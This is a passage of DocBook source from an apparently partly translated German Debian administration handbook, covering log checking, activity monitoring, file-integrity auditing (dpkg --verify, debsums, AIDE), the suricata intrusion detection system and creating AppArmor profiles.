				In allen drei Fällen sollte <command>logcheck</command> wohl so angepasst werden, dass es einige zusätzliche Meldungen ausschließt (in Abhängigkeit von den installierten Diensten), es sei denn, dass der Administrator tatsächlich jede Stunde stapelweise lange uninteressante E-Mails empfangen möchte. Da das Verfahren zur Auswahl der Meldungen recht kompliziert ist, ist es notwendig - wenn auch schwierig - die Datei <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> durchzulesen.
			</para>
			 <para>
				Die eingesetzten Regeln können in mehrere Arten unterteilt werden:
			</para>
			 <itemizedlist>
				<listitem>
					<para>
						solche, die eine Meldung als einen Einbruchsversuch einstufen (in einer Datei im Verzeichnis <filename>/etc/logcheck/cracking.d/</filename> gespeichert);
					</para>

				</listitem>
				 <listitem>
					<para>
						solche, die eine derartige Einstufung aufheben (<filename>/etc/logcheck/cracking.ignore.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						solche, die eine Meldung als Sicherheitswarnung einordnen (<filename>/etc/logcheck/violations.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						solche, die diese Einordnung aufheben (<filename>/etc/logcheck/violations.ignore.d/</filename>);
					</para>

				</listitem>
				 <listitem>
					<para>
						und schließlich solche, die auf die übrigen Meldungen zutreffen (als sogenannte <emphasis>Systemvorfälle</emphasis> angesehen werden).
					</para>

				</listitem>

			</itemizedlist>
			 <sidebar> <title><emphasis>VORSICHT</emphasis> Eine Meldung ignorieren</title>
			 <para>
				Eine Meldung, die als Einbruchsversuch oder als Sicherheitswarnung markiert worden ist (aufgrund einer Regel, die in einer Datei namens <filename>/etc/logcheck/violations.d/meine_datei</filename> gespeichert ist), kann nur mit einer Regel in den Dateien <filename>/etc/logcheck/violations.ignore.d/meine_datei</filename> oder <filename>/etc/logcheck/violations.ignore.d/meine_datei-<replaceable>erweiterung</replaceable></filename> ignoriert werden.
			</para>
			 </sidebar> <para>
				Ein Systemvorfall wird immer angezeigt, es sei denn, eine Regel in einem der Verzeichnisse des Typs <filename>/etc/logcheck/ignore.d.{paranoid,server,arbeitsplatzrechner}/</filename> bestimmt, dass der Vorfall ignoriert werden soll. Es werden natürlich nur die Verzeichnisse berücksichtigt, deren Ausführlichkeitsgrad gleich dem oder höher als der ausgewählte Betriebsmodus ist.
			</para>

		</section>
		 <section id="sect.monitoring-activity">
			<title>Aktivitäten überwachen</title>
			 <indexterm>
				<primary>Überwachung</primary>
				<secondary>Aktivität</secondary>
			</indexterm>
			 <indexterm>
				<primary>Aktivität, Überwachung</primary>
			</indexterm>
			 <section id="sect.real-time-monitoring">
				<title>In Echtzeit</title>
				 <para>
					<command>top</command> ist ein interaktives Hilfsprogramm, das eine Liste der gegenwärtig laufenden Prozesse anzeigt. Die voreingestellte Reihenfolge hängt vom momentanen Umfang der Prozessornutzung ab und kann mithilfe der <keycap>P</keycap>-Taste abgerufen werden. Andere Sortierreihenfolgen sind unter anderem nach belegtem Speicher (<keycap>M</keycap>-Taste), nach gesamter Prozessorzeit (<keycap>T</keycap>-Taste) und nach Prozesskennung (<keycap>N</keycap>-Taste). Mit der <keycap>k</keycap>-Taste kann ein Prozess abgebrochen werden, indem seine Kennung eingegeben wird. Die <keycap>r</keycap>-Taste ermöglicht das <emphasis>renicing</emphasis> eines Prozesses, das heißt, die Änderung seiner Priorität.
				</para>
				 <indexterm>
					<primary><command>top</command></primary>
				</indexterm>
				 <para>
					Wenn das System überlastet zu sein scheint, ist <command>top</command> ein großartiges Instrument, um zu sehen, welche Prozesse um die Prozessorzeit konkurrieren oder zu viel Speicher verbrauchen. Insbesondere ist es häufig interessant zu überprüfen, ob die Prozesse, die Ressourcen verbrauchen, den tatsächlichen Diensten entsprechen, die der Rechner bekanntermaßen beherbergt. Ein unbekannter Prozess, der unter dem Benutzernamen www-data läuft, sollte wirklich hervorstechen und kann untersucht werden, da er möglicherweise ein Programm ist, das durch eine Schwachstelle in einer Web-Anwendung auf dem System installiert wurde und ausgeführt wird.
				</para>
				 <para>
					<command>top</command> ist ein sehr flexibles Hilfsprogramm, und seine Handbuchseite beschreibt ausführlich, wie seine Anzeige individuell eingerichtet und an persönliche Bedürfnisse und Gewohnheiten angepasst werden kann.
				</para>
				 <para>
					The <command>gnome-system-monitor</command> graphical tool is similar to <command>top</command> and it provides roughly the same features.
				</para>
				 <indexterm>
					<primary><command>gnome-system-monitor</command></primary>
				</indexterm>

			</section>
			 <section id="sect.monitoring-history">
				<title>Verlauf</title>
				 <indexterm>
					<primary>Aktivität, Verlauf</primary>
				</indexterm>
				 <para>
					Prozessorauslastung, Netzwerkverkehr und freier Plattenplatz sind Informationen, die sich ständig ändern. Es ist häufig nützlich, den Verlauf ihrer Entwicklung festzuhalten, um genau feststellen zu können, wie der Rechner genutzt wird.
				</para>
				 <indexterm>
					<primary>SNMP</primary>
				</indexterm>
				 <indexterm>
					<primary>Simple Network Management Protocol</primary>
				</indexterm>
				 <para>
					Für diese Aufgabe gibt es zahlreiche spezialisierte Hilfsprogramme. Die meisten von ihnen können Daten über SNMP (<emphasis>Simple Network Management Protocol</emphasis>) einholen, um diese Informationen an einer Stelle zusammenzufassen. Ein weiterer Nutzen besteht darin, dass auf diese Weise Daten von Netzwerkelementen eingeholt werden können, die keine Universalrechner sind, wie spezialisierte Netzwerkrouter oder -schalter.
				</para>
				 <para>
					Dieses Buch behandelt Munin ausführlich als Teil von <xref linkend="advanced-administration" xrefstyle="select: label quotedtitle" /> (siehe <xref linkend="sect.munin" />). Debian stellt ebenfalls ein ähnliches Hilfsprogramm bereit: <emphasis role="pkg">cacti</emphasis>. Sein Einsatz ist etwas komplizierter, da es ausschließlich auf SNMP beruht. Obwohl es eine Web-Schnittstelle hat, benötigt das Verständnis der Konzepte, die für die Konfigurierung verwendet werden, noch einige Anstrengung. Die Lektüre der HTML-Dokumentation (<filename>/usr/share/doc/cacti/html/index.html</filename>) ist daher als Voraussetzung anzusehen.
				</para>
				 <sidebar> <title><emphasis>ALTERNATIVE</emphasis> <command>mrtg</command></title>
				 <indexterm>
					<primary><command>mrtg</command></primary>
				</indexterm>
				 <para>
					<command>mrtg</command> (in dem Paket ähnlichen Namens) ist ein älteres Hilfsprogramm. Trotz einiger Ecken und Kanten kann es Verlaufsdaten zusammenfassen und als Diagramme anzeigen. Es enthält eine Reihe spezieller Skripte zur Sammlung der am häufigsten überprüften Daten wie Prozessorlast, Netzwerkverkehr, Webseitenzugriffe und so weiter.
				</para>
				 <para>
					Die Pakete <emphasis role="pkg">mrtg-contrib</emphasis> und <emphasis role="pkg">mrtgutils</emphasis> enthalten Beispielskripte, die direkt verwendet werden können.
				</para>
				 </sidebar>
			</section>

		</section>
		 <section>
			<title>Änderungen erkennen</title>
			 <para>
				Nachdem das System installiert und konfiguriert ist, gibt es, abgesehen von Sicherheitsaktualisierungen, normalerweise keinen Grund, dass Dateien und Verzeichnisse sich weiterentwickeln, Daten ausgenommen. Es ist daher interessant sicherzustellen, dass Dateien sich in der Tat nicht ändern: jede unerwartete Veränderung wäre daher eine Untersuchung wert. Dieser Abschnitt stellt einige Hilfsprogramme vor, die Dateien überwachen und den Administrator warnen können, wenn eine unerwartete Veränderung auftritt (oder einfach derartige Veränderungen auflisten).
			</para>
			 <section id="sect.dpkg-verify">
				<title>Auditing Packages with <command>dpkg --verify</command></title>
				 <indexterm>
					<primary><command>dpkg</command></primary>
					<secondary><command>dpkg --verify</command></secondary>
				</indexterm>
				 <sidebar> <title><emphasis>WEITERE SCHRITTE</emphasis> Schutz vor vorgelagerten Veränderungen</title>
				 <para>
					<command>dpkg --verify</command> is useful in detecting changes to files coming from a Debian package, but it will be useless if the package itself is compromised, for instance if the Debian mirror is compromised. Protecting against this class of attacks involves using APT's digital signature verification system (see <xref linkend="sect.package-authentication" />), and taking care to only install packages from a certified origin.
				</para>
				 </sidebar> <para>
					<command>dpkg --verify</command> (or <command>dpkg -V</command>) is an interesting tool since it allows finding what installed files have been modified (potentially by an attacker), but this should be taken with a grain of salt. To do its job it relies on checksums stored in dpkg's own database which is stored on the hard disk (they can be found in <filename>/var/lib/dpkg/info/<replaceable>package</replaceable>.md5sums</filename>); a thorough attacker will therefore update these files so they contain the new checksums for the subverted files.
				</para>
				 <sidebar> <title><emphasis>BACK TO BASICS</emphasis> File fingerprint</title>
				 <indexterm>
					<primary>fingerprint</primary>
				</indexterm>
				 <indexterm>
					<primary>control sum</primary>
				</indexterm>
				 <indexterm>
					<primary>MD5</primary>
				</indexterm>
				 <indexterm>
					<primary>SHA1</primary>
				</indexterm>
				 <para>
					As a reminder: a fingerprint is a value, often a number (even though in hexadecimal notation), that contains a kind of signature for the contents of a file. This signature is calculated with an algorithm (MD5 or SHA1 being well-known examples) that more or less guarantee that even the tiniest change in the file contents implies a change in the fingerprint; this is known as the “avalanche effect”. This allows a simple numerical fingerprint to serve as a litmus test to check whether the contents of a file have been altered. These algorithms are not reversible; in other words, for most of them, knowing a fingerprint doesn't allow finding the corresponding contents. Recent mathematical advances seem to weaken the absoluteness of these principles, but their use is not called into question so far, since creating different contents yielding the same fingerprint still seems to be quite a difficult task.
				</para>
				 </sidebar> <para>
					Running <command>dpkg -V</command> will verify all installed packages and will print out a line for each file with a failing test. The output format is the same as the one of <command>rpm -V</command> where each character denotes a test on some specific meta-data. Unfortunately <command>dpkg</command> does not store the meta-data needed for most tests and will thus output question marks for them. Currently only the checksum test can yield a "5" on the third character (when it fails).
				</para>
				 
<screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
				 <para>
					In the sample above, dpkg reports a change to SSH's service file that the administrator made to the packaged file instead of using an appropriate <filename>/etc/systemd/system/ssh.service</filename> override (which would be stored below <filename>/etc</filename> like any configuration change should be). It also lists multiple configuration files (identified by the "c" letter on the second field) that had been legitimately modified.
				</para>

			</section>
			 <section id="sect.debsums">
				<title>Pakete auditieren: <command>debsums</command> und seine Grenzen</title>
				 <indexterm>
					<primary><command>debsums</command></primary>
				</indexterm>
				 <para>
					<command>debsums</command> is the ancestor of <command>dpkg -V</command> and is thus mostly obsolete. It suffers from the same limitations than dpkg. Fortunately, some of the limitations can be worked-around (whereas dpkg does not offer similar work-arounds).
				</para>
				 <para>
					Since the data on the disk cannot be trusted, <command>debsums</command> offers to do its checks based on <filename>.deb</filename> files instead of relying on dpkg's database. To download trusted <filename>.deb</filename> files of all the packages installed, we can rely on APT's authenticated downloads. This operation can be slow and tedious, and should therefore not be considered a proactive technique to be used on a regular basis.
				</para>
				 
<screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>
				 <para>
					Man beachte, dass in diesem Beispiel der Befehl <command>grep-status</command> aus dem Paket <emphasis role="pkg">grep-dctrl</emphasis> verwendet wird, das nicht standardmäßig installiert ist.
				</para>

			</section>
			 <section>
				<title>Dateien überwachen: AIDE</title>
				 <indexterm>
					<primary><emphasis role="pkg">aide</emphasis> (Debian-Paket)</primary>
				</indexterm>
				 <para>
					Das Hilfsprogramm AIDE (<emphasis>Advanced Intrusion Detection Environment</emphasis>) ermöglicht es, die Unversehrtheit von Dateien zu überprüfen und jede Veränderung durch einen Vergleich mit einem zuvor festgehaltenen Abbild des intakten Systems zu entdecken. Dieses Abbild ist als Datenbank (<filename>/var/lib/aide/aide.db</filename>) abgespeichert, die relevante Informationen über alle Dateien des Systems enthält (Fingerabdrücke, Berechtigungen, Zeitstempel und so weiter). Diese Datenbank wird erstmals mit dem Befehl <command>aideinit</command> initialisiert; sie wird dann täglich (mit dem Skript <filename>/etc/cron.daily/aide</filename>) genutzt, um nachzuprüfen, dass sich nichts Relevantes verändert hat. Wenn Veränderungen entdeckt werden, hält AIDE diese in Protokolldateien fest (<filename>/var/log/aide/*.log</filename>) und sendet seine Befunde per E-Mail an den Administrator.
				</para>
				 <sidebar> <title><emphasis>IN DER PRAXIS</emphasis> Die Datenbank schützen</title>
				 <para>
					Da AIDE eine lokale Datenbank nutzt, um den Status der Dateien zu vergleichen, ist die Gültigkeit seiner Ergebnisse direkt an die Gültigkeit der Datenbank gebunden. Falls ein Angreifer auf einem kompromittierten System Administratorrechte erlangt, ist er in der Lage, die Datenbank auszutauschen und so seine Spuren zu verwischen. Eine mögliche Behelfslösung könnte darin bestehen, die Referenzdaten auf einem schreibgeschützten Medium zu speichern.
				</para>
				 </sidebar> <para>
					Viele Optionen in <filename>/etc/default/aide</filename> können dazu verwendet werden, das Verhalten des Pakets <emphasis role="pkg">aide</emphasis> zu justieren. AIDEs eigentliche Konfiguration ist in <filename>/etc/aide/aide.conf</filename> und <filename>/etc/aide/aide.conf.d/</filename> gespeichert (diese Dateien werden genau genommen nur von <command>update-aide.conf</command> dazu benutzt, die Datei <filename>/var/lib/aide/aide.conf.autogenerated</filename> zu erstellen). Die Konfiguration gibt an, welche Eigenschaften welcher Dateien überprüft werden sollen. Der Inhalt von Protokolldateien verändert sich zum Beispiel regelmäßig, und derartige Veränderungen können ignoriert werden, solange die Berechtigungen dieser Dateien die gleichen bleiben. Aber sowohl der Inhalt als auch die Berechtigungen von ausführbaren Dateien müssen unverändert bleiben. Obwohl die Konfigurationssyntax nicht sehr komplex ist, ist sie nicht völlig intuitiv. Daher wird empfohlen, die Handbuchseite <citerefentry><refentrytitle>aide.conf</refentrytitle>
					 <manvolnum>5</manvolnum></citerefentry> zu lesen.
				</para>
				 <para>
					Eine neue Version der Datenbank wird täglich in <filename>/var/lib/aide/aide.db.new</filename> erstellt; falls alle aufgenommenen Veränderungen legitim waren, kann sie als Ersatz für die Referenzdatenbank verwendet werden.
				</para>
				 <sidebar> <title><emphasis>ALTERNATIVE</emphasis> Tripwire und Samhain</title>
				 <para>
					Tripwire ist AIDE sehr ähnlich; selbst die Syntax der Konfigurationsdatei ist fast die gleiche. Die Hauptergänzung, die von <emphasis role="pkg">tripwire</emphasis> bereitgestellt wird, ist ein Verfahren, die Konfigurationsdatei zu signieren, so dass ein Angreifer mit ihr nicht auf eine andere Version der Referenzdatenbank verweisen kann.
				</para>
				 <para>
					Samhain also offers similar features, as well as some functions to help detecting rootkits (see the sidebar <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). It can also be deployed globally on a network, and record its traces on a central server (with a signature).
				</para>
				 </sidebar> <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages"> <title><emphasis>KURZER BLICK</emphasis> Die Pakete <emphasis role="pkg">checksecurity</emphasis> und <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
				 <indexterm>
					<primary><emphasis role="pkg">checksecurity</emphasis></primary>
				</indexterm>
				 <para>
					Das erste dieser Pakete enthält verschiedene kleine Skripte, die grundlegende Prüfungen des Systems durchführen (leere Passwörter, neue setuid-Dateien usw.) und den Administrator, falls nötig, warnen. Allerdings sollte sich trotz seines eindeutigen Namens kein Administrator nur auf dieses Paket verlassen, wenn er dafür sorgen möchte, dass ein Linux-System sicher ist.
				</para>
				 <para>
					Die Pakete <emphasis role="pkg">chkrootkit</emphasis> und <emphasis role="pkg">rkhunter</emphasis> ermöglichen es, nach möglicherweise auf dem System installierten <emphasis>Rootkits</emphasis> Ausschau zu halten. Zur Erinnerung: dies sind Programme, die dazu bestimmt sind, die Kompromittierung eines Systems zu verbergen und gleichzeitig diskret den Rechner im Griff zu halten. Die Tests sind nicht zu 100% zuverlässig, aber sie können gewöhnlich die Aufmerksamkeit des Administrators auf die möglichen Probleme lenken.
				</para>
				 </sidebar>
			</section>

		</section>
		 <section id="sect.intrusion-detection">
			<title>Eindringen entdecken (IDS/NIDS)</title>
			 <indexterm>
				<primary>Entdeckung, Eindringen</primary>
			</indexterm>
			 <indexterm>
				<primary>Einbruchserkennung</primary>
			</indexterm>
			 <indexterm>
				<primary>IDS</primary>
			</indexterm>
			 <indexterm>
				<primary>Einbruchmeldesystem</primary>
			</indexterm>
			 <indexterm>
				<primary>NIDS</primary>
			</indexterm>
			 <indexterm>
				<primary>Netzwerk</primary>
				<secondary>IDS</secondary>
			</indexterm>
			 <sidebar> <title><emphasis>ZURÜCK ZU DEN GRUNDLAGEN</emphasis> Denial of Service</title>
			 <indexterm>
				<primary>Denial of Service</primary>
			</indexterm>
			 <para>
				Ein „Denial-of-Service“-Angriff hat nur ein Ziel: einen Dienst nicht verfügbar zu machen. Ob ein solcher Angriff nun darin besteht, den Server mit Anfragen zu überlasten oder einen Fehler auszunutzen, das Ergebnis ist das gleiche: der Dienst ist nicht mehr funktionsfähig. Die normalen Benutzer sind unzufrieden, und der Ruf der Organisation, die den angegriffenen Netzwerkdienst bereitstellt, erleidet Schaden (und verliert möglicherweise Einnahmen, falls zum Beispiel der Dienst eine E-Commerce-Website war).
			</para>
			 <para>
				Such an attack is sometimes “distributed”; this usually involves overloading the server with large numbers of queries coming from many different sources so that the server becomes unable to answer the legitimate queries. These types of attacks have gained well-known acronyms: <acronym>DDoS</acronym> and <acronym>DoS</acronym> (depending on whether the denial of service attack is distributed or not).
			</para>
			 </sidebar> <para>
				<command>suricata</command> (in the Debian package of the same name) is a NIDS — a <emphasis>Network Intrusion Detection System</emphasis>. Its function is to listen to the network and try to detect infiltration attempts and/or hostile acts (including denial of service attacks). All these events are logged in multiple files in <filename>/var/log/suricata</filename>. There are third party tools (Kibana/logstash) to better browse all the data collected. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" />
			</para>
			 <indexterm>
				<primary><command>snort</command></primary>
			</indexterm>
			 <indexterm>
				<primary><command>suricata</command></primary>
			</indexterm>
			 <sidebar> <title><emphasis>VORSICHT</emphasis> Wirkungsbereich</title>
			 <para>
				The effectiveness of <command>suricata</command> is limited by the traffic seen on the monitored network interface. It will obviously not be able to detect anything if it cannot observe the real traffic. When plugged into a network switch, it will therefore only monitor attacks targeting the machine it runs on, which is probably not the intention. The machine hosting <command>suricata</command> should therefore be plugged into the “mirror” port of the switch, which is usually dedicated to chaining switches and therefore gets all the traffic.
			</para>
			 </sidebar> <para>
				Configuring suricata involves reviewing and editing <filename>/etc/suricata/suricata-debian.yaml</filename>, which is very long because each parameter is abundantly commented. A minimal configuration requires describing the range of addresses that the local network covers (<literal>HOME_NET</literal> parameter). In practice, this means the set of all potential attack targets. But getting the most of it requires reading it in full and adapting it to the local situation.
			</para>
			 <para>
				On top of this, you should also edit <filename>/etc/default/suricata</filename> to define the network interface to monitor and to enable the init script (by setting <literal>RUN=yes</literal>). You might also want to set <literal>LISTENMODE=pcap</literal> because the default <literal>LISTENMODE=nfqueue</literal> requires further configuration to work properly (the netfilter firewall must be configured to pass packets to some user-space queue handled by suricata via the <literal>NFQUEUE</literal> target).
			</para>
			 <para>
				To detect bad behaviour, <command>suricata</command> needs a set of monitoring rules: you can find such rules in the <emphasis role="pkg">snort-rules-default</emphasis> package. <command>snort</command> is the historical reference in the IDS ecosystem and <command>suricata</command> is able to reuse rules written for it. Unfortunately that package is missing from <emphasis role="distribution">Debian Jessie</emphasis> and should be retrieved from another Debian release like <emphasis role="distribution">Testing</emphasis> or <emphasis role="distribution">Unstable</emphasis>.
			</para>
			 <para>
				Alternatively, <command>oinkmaster</command> (in the package of the same name) can be used to download Snort rulesets from external sources.
			</para>
			 <sidebar> <title><emphasis>WEITERE SCHRITTE</emphasis> Integration mit <command>prelude</command></title>
			 <para>
				Prelude ermöglicht eine zentralisierte Überwachung von Sicherheitsinformationen. Seine modulare Architektur enthält einen Server (den <emphasis>Manager</emphasis> im Paket <emphasis role="pkg">prelude-manager</emphasis>), der Alarmmeldungen sammelt, die von verschiedenen Arten von <emphasis>Sensoren</emphasis> erzeugt werden.
			</para>
			 <para>
				Suricata can be configured as such a sensor. Other possibilities include <emphasis>prelude-lml</emphasis> (<emphasis>Log Monitor Lackey</emphasis>) which monitors log files (in a manner similar to <command>logcheck</command>, described in <xref linkend="sect.logcheck" />).
			</para>
			 <indexterm>
				<primary><command>prelude</command></primary>
			</indexterm>
			 </sidebar>
		</section>

	</section>
	 <section id="sect.apparmor">
		<title>Introduction to AppArmor</title>
		 <indexterm>
			<primary>AppArmor</primary>
		</indexterm>
		 <section id="sect.apparmor-principles">
			<title>Prinzipien</title>
			 <para>
				AppArmor is a <emphasis>Mandatory Access Control</emphasis> (MAC) system built on Linux's LSM (<emphasis>Linux Security Modules</emphasis>) interface. In practice, the kernel queries AppArmor before each system call to know whether the process is authorized to do the given operation. Through this mechanism, AppArmor confines programs to a limited set of resources.
			</para>
			 <indexterm>
				<primary><emphasis>Mandatory Access Control</emphasis></primary>
			</indexterm>
			 <indexterm>
				<primary><emphasis>Linux Security Modules</emphasis></primary>
			</indexterm>
			 <para>
				AppArmor applies a set of rules (known as “profile”) on each program. The profile applied by the kernel depends on the installation path of the program being executed. Contrary to SELinux (discussed in <xref linkend="sect.selinux" />), the rules applied do not depend on the user. All users face the same set of rules when they are executing the same program (but traditional user permissions still apply and might result in different behaviour!).
			</para>
			 <para>
				AppArmor profiles are stored in <filename>/etc/apparmor.d/</filename> and they contain a list of access control rules on resources that each program can make use of. The profiles are compiled and loaded into the kernel by the <command>apparmor_parser</command> command. Each profile can be loaded either in enforcing or complaining mode. The former enforces the policy and reports violation attempts, while the latter does not enforce the policy but still logs the system calls that would have been denied.
			</para>

		</section>
		 <section id="sect.apparmor-setup">
			<title>Enabling AppArmor and managing AppArmor profiles</title>
			 <para>
				AppArmor support is built into the standard kernels provided by Debian. Enabling AppArmor is thus just a matter of installing a few packages and adding some parameters to the kernel command line:
			</para>
			 
<screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
			 <para>
				After a reboot, AppArmor is now functional and <command>aa-status</command> will confirm it quickly:
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
			 <sidebar> <title><emphasis>NOTE</emphasis> More AppArmor profiles</title>
			 <para>
				The <emphasis role="pkg">apparmor-profiles</emphasis> package contains profiles managed by the upstream AppArmor community. To get even more profiles you can install <emphasis role="pkg">apparmor-profiles-extra</emphasis> which contains profiles developed by Ubuntu and Debian.
			</para>
			 </sidebar> <para>
				The state of each profile can be switched between enforcing and complaining with calls to <command>aa-enforce</command> and <command>aa-complain</command> giving as parameter either the path of the executable or the path to the policy file. Additionaly a profile can be entirely disabled with <command>aa-disable</command> or put in audit mode (to log accepted system calls too) with <command>aa-audit</command>.
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
</screen>

		</section>
		 <section id="sect.apparmor-new-profile">
			<title>Creating a new profile</title>
			 <para>
				Even though creating an AppArmor profile is rather easy, most programs do not have one. This section will show you how to create a new profile from scratch just by using the target program and letting AppArmor monitor the system call it makes and the resources it accesses.
			</para>
			 <para>
				The most important programs that need to be confined are the network facing programs as those are the most likely targets of remote attackers. That is why AppArmor conveniently provides an <command>aa-unconfined</command> command to list the programs which have no associated profile and which expose an open network socket. With the <literal>--paranoid</literal> option you get all unconfined processes that have at least one active network connection.
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
</screen>
			 <para>
				In the following example, we will thus try to create a profile for <command>/sbin/dhclient</command>. For this we will use <command>aa-genprof dhclient</command>. It will invite you to use the application in another window and when done to come back to <command>aa-genprof</command> to scan for AppArmor events in the system logs and convert those logs into access rules. For each logged event, it will make one or more rule suggestions that you can either approve or further edit in multiple ways:
			</para>
			 
<screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
